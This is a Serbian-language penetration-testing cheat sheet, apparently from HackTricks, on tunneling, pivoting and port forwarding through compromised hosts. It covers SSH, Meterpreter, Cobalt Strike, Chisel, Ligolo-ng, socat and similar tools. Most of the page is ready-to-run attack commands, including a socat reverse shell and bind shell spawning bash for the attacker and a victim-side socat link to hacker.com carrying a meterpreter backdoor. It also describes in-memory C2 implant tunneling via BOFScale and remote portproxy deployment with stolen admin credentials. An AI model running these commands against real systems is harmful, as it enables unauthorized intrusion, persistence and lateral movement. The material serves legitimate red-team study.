# Tunelovanje i prosleđivanje portova

{{#include ../banners/hacktricks-training.md}}

## Savet za Nmap

> [!WARNING]
> Nmap-ova podrška za proxy ograničena je na TCP konekcije i ne utiče na ping, skeniranje portova ni skeniranje radi otkrivanja OS-a. Kada se skener nalazi iza SOCKS proxy-ja, **isključite otkrivanje hostova** (`-Pn`) i koristite **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Završna komanda koristi opcije `-u` i `-i` alata Evil-WinRM za određivanje naloga i WinRM hosta; podrazumevani WinRM port je 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH može da prosleđuje X11 veze, proizvoljne TCP portove i Unix domenske sokete kroz svoj šifrovani kanal.<sup>[[6]](#references)</sup>

Grafička SSH veza (X)

`-Y` omogućava pouzdano X11 prosleđivanje, a `-C` zahteva kompresiju prosleđenih podataka.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Otvori novi port na SSH serveru --> Drugi port

Remote prosleđivanje (`-R`) osluškuje na SSH serveru i povezuje se sa lokalnom stranom; eksplicitna bind adresa određuje kojim interfejsima je taj port dostupan.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Third_box:Port

Lokalno prosleđivanje (`-L`) osluškuje na klijentu i povezuje se sa odredištem sa strane SSH servera.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Lokalni port --> kompromitovani host (SSH) --> bilo gde

Dinamičko (`-D`) prosleđivanje kreira lokalni SOCKS4/SOCKS5 listener čije se konekcije otvaraju sa udaljene strane.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Više skokova pomoću ProxyJump

`-J`/`ProxyJump` povezuje se sa odredištem preko jednog ili više jump hostova, razdvojenih zarezima. Opcije prosleđivanja i dalje pripadaju konačnoj SSH vezi, tako da SOCKS listener ispod otvara odredišta sa `internal-target`, a ne sa prvog bastiona. Time se izbegava prijavljivanje na jump host i pokretanje drugog SSH klijenta na njemu.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Host-specific opcije za jump mašine treba navesti u `~/.ssh/config`; konfiguracija iz komandne linije namenjena odredištu ne primenjuje se automatski na posredničke hostove.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Ovo je korisno za dobijanje reverse shell-ova sa internih hostova preko DMZ-a do vašeg hosta:

Podešavanje `GatewayPorts` na serveru određuje da li remote forward može da se poveže na adresu izvan loopback interfejsa; podrazumevana vrednost je `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Ovaj primer zasnovan na root privilegijama kreira tun uređaje na oba hosta. Server mora da dozvoljava tun prosleđivanje, a izabrani nalog mora da ima pristup tun uređaju; `PermitRootLogin yes` je jedan od načina da se ovde koristi nalog `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Omogućite prosleđivanje na strani servera

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Postavite novu rutu na strani klijenta

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Bezbednost – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 je dodao strict-KEX ekstenziju za zaštitu od Terrapin napada na integritet u ranoj fazi transporta. Ažurirajte oba peer-a kada je to moguće, a za starije implementacije pratite smernice proizvođača umesto da pretpostavljate da je prosleđeni kanal zaštićen samo na osnovu verzije.<sup>[[8]](#references)</sup>

## SSHUTTLE

Možete **tunelovati** sav **saobraćaj** kroz **ssh** preko hosta do **podmreže**.\
Na primer, prosleđivanje celokupnog saobraćaja namenjenog za 10.10.10.0/24

`sshuttle` omogućava transparentno proxyovanje preko SSH-a i podržava izbor podmreža i prilagođenu SSH komandu, kao što je prikazano u nastavku.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Povezivanje pomoću privatnog ključa

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploitov `portfwd` podržava lokalno i udaljeno prosleđivanje, dok je njegov SOCKS proxy modul namenjen radu sa rutama sesije ili `autoroute` i u ovim primerima podrazumevano sluša na portu 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokalni port --> Kompromitovani host (aktivna sesija) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Još jedan način:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike-ov Beacon može da prosleđuje SOCKS4a/SOCKS5 veze kroz Beacon; `rportfwd` otvara port na kompromitovanom hostu, dok `rportfwd_local` uspostavlja vezu sa odredištem sa Cobalt Strike klijenta.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Otvorite port na Team Server-u na interfejsima preko kojih treba rutirati saobraćaj kroz Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> U ovom slučaju, **port se otvara na Beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje do Team Servera i odatle do naznačenog host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Uputstvo za reverse-forwarding navodi sledeće ponašanje:<sup>[[14]](#references)</sup>

- Beacon-ov reverse port forward osmišljen je da **tuneluje saobraćaj do Team Server-a, a ne da ga prosleđuje između pojedinačnih mašina**.
- Saobraćaj se **tuneluje unutar Beacon-ovog C2 saobraćaja**, uključujući P2P linkove.
- Visoki portovi obično zaobilaze ograničenja za privilegovane portove, ali i dalje važe pravila OS-a ciljnog sistema i ograničenja postojećih listener-a.

### rPort2Port local

> [!WARNING]
> U ovom slučaju, **port se otvara na Beacon host-u**, a ne na Team Server-u, a **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Server-u), a zatim odatle do navedenog host:port odredišta.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: TCP prosleđivanje u korisničkom prostoru bez naloga

Tailcat koristi Tailscale-ov WireGuard/NAT-traversal/DERP data plane bez Tailscale control plane-a. Nije mu potreban ni Tailscale nalog ni administratorske privilegije, a ne instalira host rute niti menja DNS. Za razliku od [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) ili [BOFScale tailnet-a](#bofscale---cdn-fronted-in-process-tailnet) koji radi unutar procesa, server deli *tailcat adresu* drugim kanalom. Klijent koristi tu adresu da pristupi portu koji pruža udaljeni čvor.<sup>[[62]](#references)</sup>

Za TCP servis koji već sluša na portu `4444` na udaljenom čvoru, pokrenite `serve` tamo i prosledite njegovu ispisanu adresu komandi `forward` na klijentu. Druga komanda podrazumevano vezuje `127.0.0.1:18080`, tako da lokalni proces koji podržava samo uobičajene TCP sokete može da se poveže na taj loopback port, dok Tailcat prenosi njegov saobraćaj do udaljenog porta `4444`.<sup>[[62]](#references)</sup> Brojevi portova nisu specifični za Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Adresa sadrži javni ključ servera WireGuard i, podrazumevano u aktuelnim izdanjima, pre-shared key. Tretirajte je kao akreditive: server bez ograničenja prihvata peer koji zna adresu. Privremena adresa prestaje da radi kada se server ugasi. Sačuvani ključ `default` omogućava da običan `serve` ponovo koristi stabilnu adresu pri narednim pokretanjima, zato proverite poruku pri pokretanju i ograničite klijente pomoću `serve --allow` ako adresa može biti izložena.<sup>[[62]](#references)</sup>

Veze mogu koristiti direktnu UDP putanju ili DERP relay. Time se izbegava potreba za namenskim C2 domenom, ali mrežna aktivnost ne nestaje.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet sa CDN-om u procesu

[BOFScale](https://github.com/NetSPI/BOFscale) pokreće izmenjeni Tailscale overlay unutar Windows C2 implanta, bez instaliranja TUN drajvera ili servisa. Sastoji se od tri komponente: asinhronog CGo `c-shared` `tailscaled` BOF-PE-a, malog C++ BOF-PE-a koji komunicira s lokalnim API-jem i asinhronog `socksportfwd` mosta između TCP-a i SOCKS5.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 i DERP kompatibilni sa CDN-om

Tailscale obično koristi vlasničke HTTP nadogradnje za kontrolni kanal TS2021 zasnovan na Noise-u i DERP relay. BOFScale zadržava te tokove bajtova, ali ih prenosi preko RFC 6455 WebSockets-a, koristeći `Sec-WebSocket-Protocol: ts2021` ili `derp`, tako da Headscale/DERP origin pod kontrolom operatera može da se nalazi iza CDN-a koji prihvata samo standardne WebSocket nadogradnje. Izmenjeni klijent ponovo pokušava TS2021 preko WebSockets-a nakon HTTP `500`, ponovo pokušava DERP nakon HTTP `426` i podešava DERP WebSocket dialer da koristi konfiguraciju proxy servera za host; BOF postavlja `TS_DEBUG_DERP_WS_CLIENT=1` kako bi preskočio prvi pokušaj, za koji se zna da neće uspeti.<sup>[[53]](#references)[[54]](#references)</sup>

CDN i origin proxy moraju da očuvaju WebSocket nadogradnje za `/ts2021` i `/derp`, prosleđuju `/key` kao običan HTTP i isključe interne read/write vremenske limite jer relay sesije mogu ostati otvorene neograničeno. Dostavljena Headscale konfiguracija omogućava `verify_clients`, objavljuje samo ugrađenu DERP mapu operatera i ostavlja `derp.urls` praznim kako bi sprečila prebacivanje na relay servere kojima upravlja Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Demon u procesu i kontrola preko named pipe-a

Ako se ne zada drugačije, ulazna tačka BOF-a pokreće `tailscaled` sa opcijama `-tun=userspace-networking`, `-state mem:` i `-no-logs-no-support`, a zatim kreira pipe sa UUID imenom. Go stdout/stderr preusmerava se preko OS pipe-a ka Beacon output API-ju, tako da ceo demon i Go runtime ostaju u memoriji, ali se stanje i logovi ne zapisuju u Tailscale direktorijum.<sup>[[53]](#references)[[54]](#references)</sup>

Laki klijent preslikava Tailscale lokalni API HTTP/1.0 preko tog pipe-a. Otvara pipe koristeći `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` jer sloj `safesocket` demona impersonira klijenta pipe-a, šalje `Tailscale-Cap: 125` i preslikava lokalni API na operacije `up`, `down`, `status`, oglašavanje ruta i gašenje.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Nemojte da uklanjate ručno mapirani Go BOF-PE nakon što zatražite gašenje demona: runtime i gorutine garbage collectora mogu nastaviti da izvršavaju kod iz memorije koju loader odmapira. Pokrenite `tailscaled` u namenskom procesu i za konačno čišćenje prekinite taj proces.<sup>[[54]](#references)</sup>

### Prosleđivanje saobraćaja koji potiče sa hosta kroz SOCKS5 u korisničkom prostoru

Dolazne tailnet veze i oglašene subnet rute rade unutar mrežnog steka u korisničkom prostoru, ali obični procesi na kompromitovanom hostu nemaju OS rutu u overlay. Zato `socksportfwd` sluša na TCP portu dostupnom sa žrtvinog hosta, pregovara o SOCKS5 `NO AUTH` vezi sa daemon listenerom na `0.0.0.0:1080`, šalje `CONNECT` za odredište u tailnetu i asinhrono prosleđuje saobraćaj u oba smera. Kada je odredište MagicDNS ime, koristi `ATYP_DOMAIN`, pa `tailscaled` razrešava ime bez izlaganja Windows resolveru.<sup>[[53]](#references)[[54]](#references)</sup>

U nastavku je prikazan minimalni tok rada operatera; i čvor operatera i implant moraju koristiti izmenjene binarne datoteke jer standardni Tailscale ne može da prođe kroz ovu CDN konfiguraciju.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Lokalno prosleđivanje može da razdvoji prividni listener za autentifikaciju od relay alata: naterajte mašinu da se autentifikuje na portu koji host sa kompromitovanom mašinom sluša, prosledite saobraćaj kroz tailnet do `ntlmrelayx`, pa ga relay-ujte dalje ka AD CS, LDAP, HTTP, SMB ili drugom kompatibilnom cilju. Pogledajte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) i [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) za faze specifične za ranjivosti; BOFScale služi samo za transport.<sup>[[54]](#references)</sup>

### Detekcija

Tražite kombinaciju pokazatelja, a ne jedan slab indikator: Go runtime u procesu koji obično nije zasnovan na Go-u, UUID pipe sa permisivnim SDDL-om `D:(A;;GA;;;WD)`, neočekivani SOCKS listener na `0.0.0.0:1080` i dugotrajne TLS WebSocket veze ka CDN adresama. Uz TLS inspekciju, označite `Sec-WebSocket-Protocol: derp` ili `ts2021` ako proces koji ih koristi nije ovlašćeni servis `tailscaled`. Pravila `bofscale.yar` u repozitorijumu sadrže memorijske potpise za sve tri BOF-PE komponente.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Projekat nudi krajnje tačke za web tunele, kao što su `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` i `tunnel.php`; otpremite jednu podržanu krajnju tačku pre pokretanja lokalnog proxy-ja.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Možete da ga preuzmete sa stranice sa izdanjima na [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel prenosi TCP/UDP saobraćaj preko HTTP-a koristeći SSH-om zaštićenu vezu; koristite kompatibilne client/server buildove i proverite sintaksu komandi za izabrano izdanje.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) prenosi statička ili dinamička prosleđivanja preko WebSocket, HTTP/2 ili WebTransport-a (HTTP/3 preko QUIC-a). Aktuelne verzije podržavaju TCP, UDP, Unix socket-e, stdio, SOCKS5, HTTP proxying i Linux listener-e za transparentni proxy u forward i reverse režimima.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Pokrenite server na napadačkoj mašini i podesite pivot da se povezuje ka spolja pomoću `-R`. U ovom smeru, SOCKS5 listener se kreira na **serveru**, dok tražene konekcije potiču iz mreže **client/pivot** mašine.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Obrnuto statičko prosleđivanje koristi isti smer. Na primer, sledeće izlaže `10.10.10.20:445`, kojem pivot može da pristupi, na loopback portu napadača `8445`:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Detalji izlaznog saobraćaja i transporta

- Dodajte `-p http://user:pass@proxy:8080` klijentu da biste prošli kroz eksplicitni HTTP proxy. U klijentima kao što je `curl` koristite `socks5h://127.0.0.1:1080` (ili omogućite proxied DNS u aplikaciji) kako bi se interna imena razrešavala preko tunela, umesto da procure do lokalnog resolvera.<sup>[[52]](#references)</sup>
- `wss://` bira WebSocket zaštićen TLS-om. Klijent sa `https://` bira HTTP/2, ali baferovanje ili konverzija u HTTP/1 koju obavljaju reverse proxy-ji/CDN-ovi često prekidaju dvosmerni tok; prilikom testiranja ovog režima, izložite wstunnel server direktno.<sup>[[52]](#references)</sup>
- `wts://` bira WebTransport preko QUIC-a. Pokrenite server sa `--enable-webtransport` (ili URL-om za osluškivanje `wts://`) i dozvolite UDP na portu za osluškivanje. Ovaj režim ne može da prolazi kroz uobičajeni HTTP `CONNECT` proxy, jer taj proxy prenosi TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Uzvodni projekat upozorava da ugrađeni samopotpisani sertifikat ne treba smatrati zaštitom privatnosti. Prednost dajte važećem prilagođenom sertifikatu uz `--tls-verify-certificate` (ili mTLS), držite proxy listenere na loopback interfejsu osim ako je udaljeni pristup nameran i tunelujte već bezbedne protokole kada je poverljivost važna.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Vodič za brzo pokretanje projekta Ligolo-ng opisuje TUN interfejs na proxy-ju, validaciju otiska sertifikata za agenta i podešavanje ruta za tunelovanu mrežu.<sup>[[17]](#references)</sup>

### Tunelovanje

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Povezivanje i osluškivanje na agentu

Ligolo-ng može da doda listenere na agentu koji prosleđuju saobraćaj ka adresi na strani proxy-ja, a njegov rezervisani opseg `240.0.0.0/4` može da se rutira kako bi se pristupilo servisima lokalnim na agentu.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Pristup lokalnim portovima agenta

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot pokreće obrnuti tunel sa žrtve i izlaže SOCKS4 proxy na loopback adresi napadača; njegov README takođe dokumentuje NTLM-proxy akreditive i opcije za hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivotiranje kroz **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombinuje tipove adresa kao što su `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; primeri u nastavku kombinuju te dokumentovane krajnje tačke.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port kroz socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter kroz SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Možete proći kroz **proxy bez autentifikacije** koristeći socat-ov dokumentovani tip adrese `PROXY`, tako što ćete u konzoli žrtve izvršiti ovaj red umesto prethodnog.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat tunel

**/bin/sh konzola**

Napravite sertifikate na obe strane: klijentu i serveru.

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Povežite lokalni SSH port (22) sa portom 443 na hostu napadača.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink je PuTTY-jev alat za povezivanje iz komandne linije, sa opcijama za SSH prosleđivanje sličnim opcijama u `ssh`-u.<sup>[[22]](#references)</sup>

Za SSH port koristite veliko slovo `-P`. Opcija `-pw` je zadržana zbog kompatibilnosti, ali otkriva lozinku na listi procesa; gde je moguće, prednost dajte autentifikaciji pomoću ključa ili opciji `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Pošto će se ovaj binarni fajl izvršavati na žrtvi i predstavlja SSH klijent, otvorite SSH servis i port za povratnu vezu; u sledećem primeru se koristi `-R` za prosleđivanje lokalno dostupnog porta do napadačeve mašine.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Koristite kontekst sa dozvolama koje zahteva host prilikom kreiranja ili menjanja trajnih pravila `portproxy`. Microsoft dokumentuje oblike `v4tov4` za dodavanje, prikazivanje i brisanje koji su korišćeni u nastavku.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Deploying `portproxy` putem zakazanog zadatka

Kada su dostupni administratorski kredencijali, daljinsko izvršavanje putem Task Scheduler-a može da instalira izvorno pravilo za prosleđivanje bez otpremanja posebnog relay-a. Na primer, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) može da podesi pivot da osluškuje na TCP/443 i prosleđuje vezu do internog SMB servisa.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Pravilo je trajno, zato ga izlistajte pomoću `netsh interface portproxy show v4tov4` i nakon testiranja eksplicitno uklonite. Imajte na umu da `portproxy` obezbeđuje samo prosleđivanje; host firewall takođe mora da dozvoli port koji osluškuje.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Morate imati **RDP pristup sistemu**.\
Preuzmite:

SocksOverRDP koristi Remote Desktop Dynamic Virtual Channels za prenos SOCKS5 veze preko postojeće RDP sesije; client plugin osluškuje na `127.0.0.1:1080`, dok se server component pokreće na RDP target-u.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz Windows funkcije Remote Desktop Service. DVC je zadužen za **tunelovanje paketa preko RDP veze**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na svom client računaru učitajte **`SocksOverRDP-Plugin.dll`** ovako:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Sada možemo da se **povežemo** sa **žrtvom** preko **RDP-a** koristeći **`mstsc.exe`** i trebalo bi da dobijemo **obaveštenje** da je **SocksOverRDP plugin omogućen**, i da će **osluškivati** na **127.0.0.1:1080**.

**Povežite** se preko **RDP-a**, otpremite i pokrenite binarnu datoteku `SocksOverRDP-Server.exe` na računaru žrtve:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Sada potvrdite na svojoj mašini (napadača) da port 1080 osluškuje:

```
netstat -antb | findstr 1080
```

Sada možeš da koristiš [**Proxifier**](https://www.proxifier.com/) za prosleđivanje saobraćaja kroz taj port.<sup>[[26]](#references)</sup>

### Lov na RDP virtuelne kanale

